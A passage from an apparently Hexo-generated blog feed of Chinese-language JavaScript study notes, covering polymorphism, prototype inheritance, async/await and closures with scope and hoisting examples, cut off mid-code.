title="使用继承来得到多态"></a>使用继承来得到多态</h2><p>在传统的静态语言编程中，如果我们要让不同的类实例化出来的对象分别完成同样的动作，比如‘叫’，我们一般就会使用继承这一特性去完成，定义一个动物类，定义默认动作——如大多数动物都会的“叫”，然后再定义不同的类（人、牛）去继承该类，然后再完成各自具体的叫声或叫法</p><p>而当如果我们只想说“看，牛在叫”，而不是“看，牛在哞哞哞”时，这个时候我们就要直接使用基类—动物类的‘叫’这个动作，因为这个动作的默认执行对象类型是animal，而不能duck、cow、human等等，那么，这个时候我们就要使用<strong>向上转型</strong>来实现了</p><p>而在JavaScript中，如果我们要使用该特性，就比较简单粗暴了，管它什么向上转型，你不是会叫吗，我直接把你这个动物类怼到函数不就行，就像上面的唱歌，这便是动态语言的好处，注重实现，不注重主体——给我叫，管你猪或鸭</p><h2 id="多态在面向对象程序设计的作用"><a href="#多态在面向对象程序设计的作用" class="headerlink" title="多态在面向对象程序设计的作用"></a>多态在面向对象程序设计的作用</h2><p>看完这部分，总结成一段话</p><blockquote><p>多态可以把过程化的条件分支语句转化为对象的多态性，从而消除这些条件分支语句，增加代码可阅读性</p></blockquote><p>就比如营长喊开炮时，各个职位的人开始负责不同的事，运输兵运送炮弹，炮兵负责开炮，辅助员（我不知道该叫啥）装填弹药，而不是营长按照人员单，来到炮兵面前说，你开炮，接着跑到装炮弹员旁边，你装；跑到运输兵，你去运炮弹，这么一来，可能营长跑着跑着，自己已经中弹身亡了有木有，或还没等执行完，敌人已经冲到你面前了会不会。</p><p>所以在js中，我们一般会封装一个函数去执行不同操作对象的同个动作，从而避免代码维护性难度的增加</p><p>比如我们要使用arcgis提供的地图服务，然后在某一天，我们因为需求需要改成腾讯的，如果不封装从而实现多态的话，在以后我们可能会因为换一个api而改动大量的代码，这是极其痛苦q的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> renderMap = <span class="function"><span class="keyword">function</span>(<span class="params">type</span>) </span>&#123;</span><br><span class="line">  type.map()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//模拟arcgis的底图</span></span><br><span class="line"><span class="keyword">var</span> Arcgis = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.map = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'arcgis'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//模拟腾讯地图</span></span><br><span class="line"><span class="keyword">var</span> Tencent = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.map = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Tencent map'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">renderMap(<span class="keyword">new</span> Arcgis()) <span class="comment">//arcgis</span></span><br><span class="line">renderMap(<span class="keyword">new</span> Tencent()) <span class="comment">//Tencent map</span></span><br></pre></td></tr></table></figure><p>如果在实际开发中遇到同个实现效果的api不同方法名的话，我们可以借助<strong>设配器模式</strong>（待补充）来解决该问题</p><h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><p>总而言之——封装的目的就是将信息隐藏，不仅仅包括隐藏数据、还包括隐藏设计细节、实现细节、以及对象的类型，封装使得对象之间的耦合度变松散，对象之间只通过暴露的API接口来通信</p><p>一般就是通过抽象类和接口来实现封装，像上面的地图调用、以及动物唱歌，算了还是叫声好一点，就是封装的过程，在这个过程你就会不自觉发现同样实现了多态</p><h1 id="原型模式和基于原型继承的JavaScript对象系统"><a href="#原型模式和基于原型继承的JavaScript对象系统" class="headerlink" title="原型模式和基于原型继承的JavaScript对象系统"></a>原型模式和基于原型继承的JavaScript对象系统</h1><h2 id="Object-create"><a href="#Object-create" class="headerlink" title="Object.create"></a>Object.create</h2><blockquote><p>在以类为中心的面向对象编程语言中，类和对象的关系可以想象成铸模和铸件的关系，对象总是从类中创建而来。而在原型编程的思想中，类并不是必需的，对象未必需要从类中创建而来，一个对象是通过克隆另外一个对象所得到的。</p></blockquote><p>如果使用原型模式，我们只需要调用负责克隆的方法，完成对象的创建</p><p>ECMAScript 5提供了Object.create 方法，可以用来克隆对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Plane = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">  <span class="keyword">this</span>.blood = <span class="number">100</span>; </span><br><span class="line">  <span class="keyword">this</span>.attackLevel = <span class="number">1</span>; </span><br><span class="line">  <span class="keyword">this</span>.defenseLevel = <span class="number">1</span>; </span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">var</span> plane = <span class="keyword">new</span> Plane(); </span><br><span class="line">plane.blood = <span class="number">500</span>; </span><br><span class="line">plane.attackLevel = <span class="number">10</span>; </span><br><span class="line">plane.defenseLevel = <span class="number">7</span>; </span><br><span class="line"><span class="keyword">var</span> clonePlane = <span class="built_in">Object</span>.create( plane ); </span><br><span class="line"><span class="built_in">console</span>.log( clonePlane ); <span class="comment">// 输出：Object &#123;blood: 500, attackLevel: 10, defenseLevel: 7&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Io语言体验"><a href="#Io语言体验" class="headerlink" title="Io语言体验"></a>Io语言体验</h2><p>好的，我没有体验，<a href="http://iolanguage.com" target="_blank" rel="noopener">官网地址</a>，反正它就是明显的以克隆的方式创造“世界”，Io语言中最初只有一个根对象Object，其它对象就像克隆一样，从它不断“衍生”出来</p><p>通过Io学习主要记住以下几点</p><ol><li><p><strong>原型链</strong>就是从根节点到当前节点的所有对象</p><p>比如：object是Animal的原型，而Animai是Dog的原型，它们之间便是一条原型链</p></li><li><p>JS同Io一样，基于原型链的委托机制就是原型继承的本质</p></li><li><p>原型编程的重要特性：当对象无法响应某个请求时，会把该请求<strong>委托</strong>给它自己的<strong>原型</strong></p></li></ol><p>现原型编程范型至少包括以下基本规则</p><ul><li>所有的数据都是<strong>对象</strong></li><li>要得到一个对象，不是通过实例化类，而是找到一个对象作为原型并克隆它</li><li>对象会记住它的原型</li><li>如果对象无法响应某个请求，它会把这个请求委托给它自己的原型</li></ul><h2 id="JavaScript中的原型继承"><a href="#JavaScript中的原型继承" class="headerlink" title="JavaScript中的原型继承"></a>JavaScript中的原型继承</h2><blockquote><p>JavaScript 同样遵守原型编程的基本规则</p></blockquote><h3 id="所有的数据都是对象"><a href="#所有的数据都是对象" class="headerlink" title="所有的数据都是对象"></a>所有的数据都是对象</h3><p>JavaScript 中的根对象是 Object.prototype 对象。Object.prototype 对象是一个空的对象。我们在 JavaScript 遇到的每个对象，实际上都是从 Object.prototype 对象克隆而来的， Object.prototype 对象就是它们的原型。</p><p>在 JavaScript 语言里，我们并不需要关心克隆的细节，因为这是引擎内部负责实现的。</p><h3 id="JS的克隆"><a href="#JS的克隆" class="headerlink" title="JS的克隆"></a>JS的克隆</h3><p>JavaScript 的函数既可以作为普通函数被调用， 也可以作为构造器被调用。当使用 new 运算符来调用函数时，此时的函数就是一个构造器。 用 new 运算符来创建对象的过程，实际上也只是先克隆 Object.prototype 对象，再进行一些其他额外操作的过程。</p><h3 id="对象会记住它的原型"><a href="#对象会记住它的原型" class="headerlink" title="对象会记住它的原型"></a>对象会记住它的原型</h3><p>JavaScript 给对象提供了一个名为_proto_的隐藏属性，某个对象的_proto_属性默认会指 向它的构造器的原型对象，即{Constructor}.prototype。</p><p>_proto_就是对象跟“对象构造器的原型”联系起来的纽带。（<strong>_proto_：指向该对象的构造函数的原型对象，prototype指向该方法的原型对象</strong>——来自<a href="https://www.zhihu.com/question/34183746/answer/58155878" target="_blank" rel="noopener">知乎</a>）</p><h3 id="对象委托"><a href="#对象委托" class="headerlink" title="对象委托"></a>对象委托</h3><p>JavaScript 的对象最初都是由 Object.prototype 对象克隆而来的，但对象构造器的原型并不仅限于 Object.prototype 上，而是可以动态指向其他对象。</p><p>原型链并不是无限长的，当对象通过原型链找某个属性找到根节点而找不到时，则会返回undefined（Object.prototype 的原型是 null）</p><h1 id="原型继承的未来"><a href="#原型继承的未来" class="headerlink" title="原型继承的未来"></a>原型继承的未来</h1><p>除了根对象 Object.prototype 本身之外，任何对象都会有一个原型。而通过 Object.create( null )可以创建出<strong>没有原型</strong>的对象。</p><p>ECMAScript 6 带来了新的 Class 语法。这让 JavaScript 看起来像是一门基于类的语言， 但其背后仍是通过原型机制来创建对象。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>上面就是自己在学习第一部分第一节所画下以及自己所理解的重点了，里面依旧有许多对目前的自己晦涩难懂的代码，实在是太菜了，在以后慢慢吃透js（不可能，还没吃完就来新的😂）的过程中回来看看这些自己不懂的代码和概念吧</p><p>但毕竟收获是有的，通过之前学的C#结合JavaScript来进一步理解多态、封装以及在这两种不同编程风格的代码实现，也了解了原来js的对象是通过原型模式（克隆）实现继承的，大开眼界</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>async/await学习</title>
      <link href="/2021/03/10/async%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/03/10/async%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="单线程、主线程与任务队列"><a href="#单线程、主线程与任务队列" class="headerlink" title="单线程、主线程与任务队列"></a>单线程、主线程与任务队列</h1><p>我们知道，JavaScript是单线程的。也就是它只能一个线程去执行任务。什么是单线程呢</p><p>举个栗子：你要做家务，要拖地、还要煮饭、还要洗衣服，那么你只能一件一件事情完成，在拖完地后煮饭，之后再洗衣服，当然你也可以叫你旁边的人帮你洗衣服，然后你拖地，这样子的话，两个人做就算做双线程了，多个人的话就是多线程了，而现在是js在执行任务，你就不能去叫别人来帮忙了，那么你只能一件一件做了，这便是单线程。</p><p>接下来来理解一下异步是怎么一回事。</p><p>还是拿上面那件事，假设现在洗衣服可以通过异步完成——洗衣机洗衣服、煮饭可以通过电饭煲煮，那么我们就可以这样做——把衣服放到洗衣机、米放到电饭煲、然后执行拖地，拖完地了，可能衣服这时候已经晾好了，那么我们就可以去晾个衣服、晾完衣服饭也煮好了，那么我们就可以去吃饭了。</p><p>这便是js的执行过程，<strong>主线程</strong>执行同步任务——拖地，<strong>任务队列</strong>存放异步任务——洗衣机洗好了衣服、电饭煲煮好了饭。</p><p>那么我们就可以理解，什么是主线程——<strong>执行同步任务</strong>，什么是任务队列——<strong>存放异步任务的结果</strong>，js首先执行主线程里面的任务，当主线程中的同步任务执行完后，就开始从任务队列读取，哪些异步任务执行好了，执行好的就拿过来执行栈（主线程）执行，然后不断循环执行。</p><p><img src= "/img/loading.gif" data-src="/2021/03/10/async%E5%AD%A6%E4%B9%A0/image-20210316103038500.png" alt="主线程与任务队列"></p><h1 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h1><p>了解了异步的基础——主线程与任务队列后，我们来进入下个知识点——<a href="https://ypigy.gitee.io/2020/07/20/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/" target="_blank" rel="noopener">异步编程</a></p><p>博客讲解了怎么<strong>得到函数内部异步操作的结果</strong>，以及因此而产生的<strong>回调地狱</strong>问题，以及如何解决回调地狱——<strong>Promise</strong></p><p>注意：Promise是进入async/await学习必须理解的知识点</p><h1 id="async-await"><a href="#async-await" class="headerlink" title="async/await"></a>async/await</h1><p>首先了解async和await的书写规范</p><p>async必须写在function前面，除了这里，在其他地方声明都会报错</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>await必须在async声明的函数内部使用，注意：不能跨过该函数作用域使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//可以</span></span><br><span class="line"><span class="keyword">let</span> x = <span class="number">3</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> y = <span class="keyword">await</span> x</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不可以</span></span><br><span class="line"><span class="keyword">let</span> x = <span class="number">3</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">let</span> y = <span class="keyword">await</span> x</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">a()</span><br></pre></td></tr></table></figure><p><strong>await作用</strong>：等待一个Promise的异步返回才会执行下面的代码(await是在等待一个Promise的异步返回)</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>首先声明两个异步函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wait1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="string">'我延迟了一秒'</span>)</span><br><span class="line">      <span class="comment">// reject('我延迟一秒出错了')</span></span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wait2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="string">'我延迟了两秒'</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们想要在执行完wait1后执行wait2，在传统的Promise执行是这样的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传统Promise</span></span><br><span class="line">wait1()</span><br><span class="line">  .then(<span class="function">(<span class="params">res,rej</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">    <span class="keyword">return</span> wait2()</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function">(<span class="params">res,rej</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>async/await执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// async</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> b = <span class="keyword">await</span> wait1()</span><br><span class="line">  <span class="keyword">let</span> c = <span class="keyword">await</span> wait2()</span><br><span class="line">  <span class="built_in">console</span>.log(c)</span><br><span class="line">  <span class="built_in">console</span>.log(b)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'哈哈哈'</span>)</span><br><span class="line">&#125;</span><br><span class="line">a().catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>有没觉得简单了许多，<strong>async的出现主要就是为了解决Promise造成的冗余的长长的链式代码，这样做也可以使代码的语义化更加清楚</strong>，这里有一篇<a href="https://segmentfault.com/a/1190000016788484?_ea=4854890" target="_blank" rel="noopener">博客</a>推荐阅读，详细的介绍了async</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闭包</title>
      <link href="/2021/03/06/%E9%97%AD%E5%8C%85/"/>
      <url>/2021/03/06/%E9%97%AD%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文从作用域和预解析出发，之后再去了解闭包（了解这个可以更好的了解闭包的环境）然后后面就再谈谈下闭包的this指向问题以及和闭包密切相关的变量生命周期啦。</p><p>推荐大家看看<a href="https://www.bilibili.com/video/BV1YJ411R7ap?from=search&seid=7436258571751414785" target="_blank" rel="noopener">B站闭包</a>，感觉挺ok的</p></blockquote><h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><p>在了解闭包之前，我们得首先了要解什么是作用域以及预解析的相关内容</p><blockquote><p>作用域：变量可以起作用的范围</p></blockquote><h2 id="全局变量和局部变量"><a href="#全局变量和局部变量" class="headerlink" title="全局变量和局部变量"></a>全局变量和局部变量</h2><ul><li><p>全局变量</p><p>在任何地方都可以访问到的变量就是全局变量，对应全局作用域</p></li><li><p>局部变量</p><p>只在固定的代码片段内可访问到的变量，最常见的例如函数内部。对应局部作用域(函数作用域)</p></li></ul><blockquote><p>没有声明的变量是全局变量。<br><strong>变量退出作用域之后会销毁，全局变量关闭网页或浏览器才会销毁</strong></p></blockquote><h2 id="块级作用域"><a href="#块级作用域" class="headerlink" title="块级作用域"></a>块级作用域</h2><p>任何一对花括号（｛和｝）中的语句集都属于一个块，在这之中定义的所有let或const变量在代码块外都是不可见的，我们称之为块级作用域。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> b = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">let</span> a = <span class="number">2</span></span><br><span class="line"><span class="keyword">var</span> c =<span class="number">3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a,b,c) <span class="comment">//a:not defined b:1 c:3</span></span><br></pre></td></tr></table></figure><h2 id="for循环作用域"><a href="#for循环作用域" class="headerlink" title="for循环作用域"></a>for循环作用域</h2><p>若在for循环中用let定义i，则每次循环都会产生一个块级作用域</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">10</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若使用var定义，则为全局作用域</p><h2 id="作用域链"><a href="#作用域链" class="headerlink" title="作用域链"></a>作用域链</h2><blockquote><p>只有函数可以制造作用域结构， 那么只要是代码，就至少有一个作用域, 即全局作用域。凡是代码中有函数，那么这个函数就构成另一个作用域。如果函数中还有函数，那么在这个作用域中就又可以诞生一个作用域。</p><p>将这样的所有的作用域列出来，可以有一个结构: 函数内指向函数外的链式结构。就称作作用域链。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f4</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2021/03/06/%E9%97%AD%E5%8C%85/06-1.png" alt="图源网络"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="number">123</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(num); </span><br><span class="line">    &#125;</span><br><span class="line">    f2();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> num = <span class="number">456</span>;</span><br><span class="line">f1(); <span class="comment">//123</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2021/03/06/%E9%97%AD%E5%8C%85/06-2.png" alt="图源网络"></p><h1 id="预解析"><a href="#预解析" class="headerlink" title="预解析"></a>预解析</h1><blockquote><p>JavaScript代码的执行是由浏览器中的JavaScript解析器来执行的。JavaScript解析器执行JavaScript代码的时候，分为两个过程：预解析过程和代码执行过程</p></blockquote><p>预解析过程：</p><ol><li>把变量的声明提升到当前作用域的最前面，只会提升声明，不会提升赋值。</li><li>把函数的声明提升到当前作用域的最前面，只会提升声明，不会提升调用。</li><li>先提升var，再提升function。</li></ol><p>JavaScript的执行过程</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 案例1</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">25</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(a); <span class="comment">//undefined</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">abc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 案例2</span></span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">//[Function: a]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'aaaaa'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">//1</span></span><br></pre></td></tr></table></figure><blockquote><p>这一部分源于很久之前自己学的JavaScript，那个老师讲的很好，就是不知道出处在哪里了。</p></blockquote><h2 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h2><ul><li><p>变量提升</p><p>定义变量的时候，变量的声明会被提升到作用域的最上面，变量的赋值不会提升。</p></li><li><p>函数提升</p><p>JavaScript解析器首先会把当前作用域的函数声明提前到整个作用域的最前面</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f1();</span><br><span class="line"><span class="built_in">console</span>.log(c);</span><br><span class="line"><span class="built_in">console</span>.log(b);</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = b = c = <span class="number">9</span>; <span class="comment">//等同于var a = 9; b = 9; c = 9</span></span><br><span class="line">  <span class="built_in">console</span>.log(a);</span><br><span class="line">  <span class="built_in">console</span>.log(b);</span><br><span class="line">  <span class="built_in">console</span>.log(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>子函数和其访问其他函数的变量统称为一个闭包，如下图</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/22486908" target="_blank" rel="noopener">知乎</a>中的解释：<strong>「函数」和「函数内部能访问到的变量」（也叫环境）的总和，就是一个闭包。</strong></p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/03/06/%E9%97%AD%E5%8C%85/image-20200806154954104.png" alt="image-20200806154954104"></p><h2 id="闭包的作用"><a href="#闭包的作用" class="headerlink" title="闭包的作用"></a>闭包的作用</h2><blockquote><p>作用：闭包常常用来「间接访问一个变量」。换句话说，「隐藏一个变量」。</p><p>让变量的值始终保持在内存中</p></blockquote><p>如下面定义了一个数组对象，我么们要挑选价格在1-10之间的商品，于是我们定义了一个函数，a和b是这个函数的变量，我们在里面又定义一个函数去获取这两个变量并求我们需要的值，最终在全局去使用这个值，于是我们就用到了闭包。</p><p>这样写的优点：防止变量<strong>污染全局（函数作用域）</strong>，且可以得到函数体内的<strong>私有成员（return）</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> commodity = [</span><br><span class="line">&#123;</span><br><span class="line">        title: <span class="string">'apple'</span>,</span><br><span class="line">        price: <span class="number">10</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        title: <span 